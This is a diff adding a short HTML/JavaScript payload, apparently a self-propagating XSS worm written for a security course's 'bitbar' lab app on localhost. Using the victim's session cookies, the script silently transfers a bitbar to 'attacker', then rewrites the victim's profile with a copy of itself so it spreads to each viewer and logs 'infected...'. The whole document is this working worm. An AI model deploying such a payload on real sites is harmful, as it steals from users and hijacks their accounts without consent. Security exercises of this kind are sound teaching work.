@@ -1,0 +1,21 @@
+<span id="bitbar_count" class="10"></span>
+<script>
+	var params = "destination_username=attacker&quantity=1";
+	var req = new XMLHttpRequest();
+	req.withCredentials = true;
+	req.onload = function() {
+		var worm = document.getElementById("profile");
+		var params = "new_profile=".concat(encodeURIComponent(worm.innerHTML));
+		var req = new XMLHttpRequest();
+		req.withCredentials=true;
+		req.onload = function() {
+			console.log("infected...");
+		}
+		req.open("POST", "http://localhost:3000/set_profile");
+		req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+		req.send(params);
+	}
+	req.open("POST", "http://localhost:3000/post_transfer");
+	req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	req.send(params);
+</script>
